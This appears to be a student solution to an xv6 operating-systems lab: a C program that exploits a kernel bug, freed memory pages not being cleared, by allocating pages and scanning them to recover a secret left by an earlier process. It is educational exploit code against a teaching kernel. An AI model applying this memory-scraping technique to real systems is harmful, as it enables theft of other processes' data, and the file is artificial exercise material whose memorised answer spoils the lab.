#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// attack exploits a kernel bug (newly allocated pages are no longer cleared)
// to recover a secret that a previous process (secret.c) left in memory.
// secret.c writes the string "Here it is: <secret>" into freshly sbrk'd
// memory and then exits, freeing those pages.  Because freed/allocated pages
// are not scrubbed, sbrk'ing memory here can hand us those same physical
// pages with the secret still in them.

#define MARKER "Here it is: "
#define NPAGES 64

// A real secret is a non-empty, null-terminated run of letters/digits.
// (The compile-time string literal "Here it is: " also survives in secret's
// freed read-only pages, but there it is followed immediately by a null, so
// this check lets us skip those false matches.)
static int
valid_secret(char *s, char *limit)
{
  int n = 0;

  for (; s < limit && *s != '\0'; s++, n++) {
    char c = *s;
    if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') ||
          (c >= 'A' && c <= 'Z')))
      return 0;              // non-alphanumeric byte: not a real secret
  }
  if (s >= limit)
    return 0;                // ran off the region without a null terminator
  return n > 0;              // must be non-empty
}

int
main(int argc, char *argv[])
{
  int mlen = strlen(MARKER);
  int size = NPAGES * PGSIZE;

  // Grab a chunk of memory that may include secret.c's freed pages.
  char *mem = sbrk(size);
  if (mem == (char *)-1) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }
  char *limit = mem + size;

  // Scan for the marker followed by a genuine secret.
  for (char *p = mem; p <= limit - mlen; p++) {
    if (memcmp(p, MARKER, mlen) == 0 && valid_secret(p + mlen, limit)) {
      printf("%s\n", p + mlen);
      exit(0);
    }
  }

  exit(1);
}
